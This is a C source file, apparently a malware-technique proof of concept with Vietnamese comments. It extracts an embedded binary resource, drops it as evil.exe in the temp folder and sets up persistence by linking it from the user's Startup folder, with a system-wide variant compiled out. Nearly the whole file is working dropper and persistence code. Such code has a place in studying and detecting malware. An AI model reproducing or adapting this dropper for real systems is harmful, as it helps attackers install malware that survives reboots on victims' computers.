#include "resource.h"
#include <tchar.h>
#include <stdio.h>
#include <stdlib.h>
#include <ShlObj.h>
#include <Shlwapi.h>
#include <Windows.h>
#pragma comment(lib, "User32.Lib")
#pragma comment(lib, "Shlwapi.lib")
#pragma comment(lib, "shell32.lib")

#define INFO_BUFFER_SIZE 32767

/*
** Mô tả:
** - Malware dropped tệp độc hại hoặc tệp .lnk/shortcut vào Startup folder
** - Mỗi khi máy tính khởi động lại thì cũng tự động thực thi malware
** - Một số startup folder:
	+ C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp
	+ C:\Users\<Username>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
** PoC:
** - Dropped tệp độc hại vào %TEMP% sau đó tạo shortcut trỏ đến tệp độc hại
** Ref:
** 1. Getting System Information
	https://docs.microsoft.com/en-us/windows/win32/sysinfo/getting-system-information
** 2. Win32 API: SHGetFolderPathW, SHGetSpecialFolderPathW, PathAppendW
	https://docs.microsoft.com/en-us/windows/win32/api/shlobj_core/nf-shlobj_core-shgetfolderpathw
	https://docs.microsoft.com/en-us/windows/win32/api/shlobj_core/nf-shlobj_core-shgetspecialfolderpathw
	https://docs.microsoft.com/en-us/windows/win32/api/shlwapi/nf-shlwapi-pathappendw
** 3. CSIDL
	https://docs.microsoft.com/en-us/windows/win32/shell/csidl
*/


int main()
{
	// *** Stage 1: Find and load resource ***
	HRSRC	hRes;			 // handle/ptr resource
	HGLOBAL	hResLoad;		 // handle to loaded resource
	LPVOID	lpResLock;		 // pointer to resource data

	// Locate the resource in file.
	printf(" [+] Finding resource.\n");
	Sleep(500);

	hRes = FindResourceA(
		NULL,		// locate resource current process
		101,		// name of resource (resource ID)
		"BIN");		// type of resource
	if (hRes == NULL) {
		printf(" [-] Could not locate resource. Error Code = %d\n", GetLastError());
		return;
	}

	// Load the resource into global memory.
	hResLoad = LoadResource(
		NULL,	// current process
		hRes);	// handle to the resource
	if (hResLoad == NULL) {
		printf(" [-] Could not load resource. Error Code = %d\n", GetLastError());
		return;
	}

	// Lock the resource into global memory.
	lpResLock = LockResource(hResLoad);
	if (lpResLock == NULL) {
		printf(" [-] Could not lock resource. Error Code = %d\n", GetLastError());
		return;
	}


	// *** Stage 2: Dropped/Extract/Write resource binary to file ***
	DWORD	dwSizeOfRes = 0;			// size (bytes) of the specified resource
	TCHAR	filePath[MAX_PATH];			// full path of file dropped
	TCHAR	lpTempPathBuffer[MAX_PATH];	// path of temp directory
	DWORD	dwRetVal = 0;				// temp variable

	printf(" [+] Dropping evil file.\n");
	Sleep(500);

	// Calculating size of resource
	dwSizeOfRes = SizeofResource(
		NULL,	// current process
		hRes);	// handle/ptr resource

	// Get the temp path env
	dwRetVal = GetTempPathW(
		MAX_PATH,          // length of the buffer
		lpTempPathBuffer); // buffer for path 
	if (dwRetVal > MAX_PATH || (dwRetVal == 0)) {
		printf(" [-] Could not get temp path. Error Code = %d\n", GetLastError());
		return;
	}
	
	// Generates a temporary file name.
	wsprintfW(filePath, TEXT("%sevil.exe"), lpTempPathBuffer);
	
	HANDLE	hFileWriter;
	DWORD	dwBytesWritten = 0;
	BOOL	bErrorFlag = FALSE;

	// Create dropped file
	hFileWriter = CreateFile(
		filePath,				// name of the write
		GENERIC_WRITE,			// open for writing
		NULL,					// do not share
		NULL,					// default security
		CREATE_ALWAYS,			// create new file, always
		FILE_ATTRIBUTE_NORMAL,	// normal file
		NULL);					// no attr. template
	if (hFileWriter == INVALID_HANDLE_VALUE) {
		printf(" [-] Terminal failure: Unable to open file \"%ls\" for write. Error Code = %d\n", filePath, GetLastError());
		return;
	}

	printf(" [+] Writing %d bytes to \"%ls\".\n", dwSizeOfRes, filePath);
	Sleep(500);

	bErrorFlag = WriteFile(
		hFileWriter,		// open file handle
		lpResLock,			// start of data to write
		dwSizeOfRes,		// number of bytes to write
		&dwBytesWritten,	// number of bytes that were written
		NULL);				// no overlapped structure
	if (FALSE == bErrorFlag) {
		printf(" [-] Terminal failure: Unable to write to \"%ls\". Error Code = %d\n", filePath, GetLastError());
	}
	else {
		if (dwBytesWritten != dwSizeOfRes) {
			printf(" [-] Error: dwBytesWritten != dwSizeOfRes. Error Code = %d\n", GetLastError());
		}
		else {
			printf(" [+] Wrote %d bytes to \"%ls\" successfully.\n", dwBytesWritten, filePath);
		}
	}
	CloseHandle(hFileWriter);


	/*
	** Stage 3: Persistence via Startup Folder
	*/
#if 0
	/*
	** Xác định các startup folder cách 1: Sử dụng wsprintfW() để định dạng path
	** - C:\\Users\\<Username>\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\
	** - C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\
	*/
	TCHAR	usernameBuff[INFO_BUFFER_SIZE];
	DWORD	bufCharCount = INFO_BUFFER_SIZE;
	TCHAR	systemStartUp[MAX_PATH] = L"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\";
	TCHAR	userStartUp[MAX_PATH];

	if (!GetUserNameW(usernameBuff, &bufCharCount))
		printf(" [-] GetUserName Error. Code = %d\n", GetLastError());
	wsprintfW(userStartUp, TEXT("C:\\Users\\%s\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\"), usernameBuff);
#endif // 1

#if 1
	/*
	** Xác định các startup folder cách 2: Sử dụng SHGetFolderPath()
	** - Startup folder người dùng: CSIDL_ALTSTARTUP, CSIDL_STARTUP
	** - Startup folder hệ thống: CSIDL_COMMON_ALTSTARTUP, CSIDL_COMMON_STARTUP
	*/
	TCHAR		userStartUp[MAX_PATH];
	TCHAR		systemStartUp[MAX_PATH];

	if (S_OK != SHGetFolderPath(NULL, CSIDL_STARTUP, NULL, 0, userStartUp)) {
		printf(" [-] Failed to get User Startup folder. Code = %d\n", GetLastError());
	}

	if (S_OK != SHGetFolderPath(NULL, CSIDL_COMMON_STARTUP, NULL, 0, systemStartUp)) {
		printf(" [-] Failed to get System Startup folder. Code = %d\n", GetLastError());
	}
	
#endif // 0

	Sleep(500);
	printf(" [+] Setting up Persistence via Startup Folder.\n");
	
#if 1
	// Persistence via user startup folder
	PathAppendW(userStartUp, TEXT("evil.lnk"));
	BOOL fCreatedUserStartUpLink = CreateSymbolicLinkW(userStartUp, filePath, NULL);
	if (fCreatedUserStartUpLink == FALSE) {
		printf(" [-] Failed to create symbolic link. Code = %d\n", GetLastError());
		return;
	}
#endif // 1

#if 0
	// Persistence via system startup folder
	PathAppendW(systemStartUp, TEXT("evil.lnk"));
	BOOL fCreatedSystemStartUpLink = CreateSymbolicLinkW(systemStartUp, filePath, NULL);
	if (fCreatedSystemStartUpLink == FALSE) {
		printf(" [-] Failed to create symbolic link. Code = %d\n", GetLastError());
		return;
	}
#endif // 1

	Sleep(500);
	printf(" [+] Successfully. Goodbye!\n");
	return 0;
}